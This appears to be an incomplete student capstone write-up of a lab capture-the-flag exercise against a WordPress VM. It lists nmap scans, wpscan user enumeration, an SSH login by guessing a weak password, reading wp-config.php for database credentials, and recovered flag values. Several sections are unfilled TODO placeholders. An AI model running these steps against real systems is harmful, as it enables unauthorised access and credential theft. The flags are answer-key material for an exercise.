# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Step 1: Scan the network to identify the IP addresses of Target 1

`nmap -sP 192.168.1.1-255`

[nmap IP Scan results](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_nmap_IPs_Target1.PNG "nmap IP Scan results")

`nmap -sV 192.168.1.110`

Step 2: Document all exposed ports and services.

[nmap Port Scan results](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_nmap_Ports_Target1.PNG "nmap Port Scan results")

Due to `port 80` being open, we went directly to the website via p`ort 80` `192.168.1.110:80` and discovered that Raven Security is a WordPress Commenter, giving us the clue to run the wordpress scan. 

WORDPRESS SCREENSHOT

This scan identifies the services below as potential points of entry:
- Target 1
  - 22 - SSH
  - 80 - HTTP

_TODO: Fill out the list below. Include severity, and CVE numbers, if possible._

The following vulnerabilities were identified on each target:
- Target 1
  - List of
  - Critical
  - Vulnerabilities

_TODO: Include vulnerability scan results to prove the identified vulnerabilities._

Step 3: Enumerate the WordPress site. 

- `wpscan –-url http://192.168.1.110/wordpress -eu`

- Users Identified
  - steven
  - michael
  - [Enumeration Output](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/Kali_Users_Identified.PNG "Enumeration Output")

Step 4: Use SSH to gain a user shell

- `ssh michael@192.168.1.110`
- `Guess-Enter password: michael`  → success
- [Michael login results](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_login_michael.PNG "Michael login results")


### Exploitation
_TODO: Fill out the details below. Include screenshots where possible._

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - Flag #1 {b9bbcb33e11b80be759c4e844862482d}
    - `grep -RE flag html`
    - [Flag 1](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_michael_flag1.PNG "Flag 1")


  - Flag #2 {fc3fd58dcdad9ab23faca6e9a36e581c} 
    - `cd /var/www`
    - `cat flag2.txt`
    - [Flag 2](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_michael_flag2.PNG "Flag 2")

Step 5: Find the MySQL database password.

- `cat /var/www/html/wordpress/wp-config.php`

  - Flag #3

    - **Exploit Used**
      - _TODO: Identify the exploit used_
      - _TODO: Identify the command used_

      - [Flag 3](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_mySQL_wp_posts_flags.PNG "Flag 3")
      
  - Flag #4

    - **Exploit Used**
      - _TODO: Identify the exploit used_
      - _TODO: Identify the command used_

      - [Flag 4](https://github.com/joshblack07/UR-Cyber-Security-Capstone-3/blob/main/Resources/kali_root_python_flag4.PNG "Flag 4")
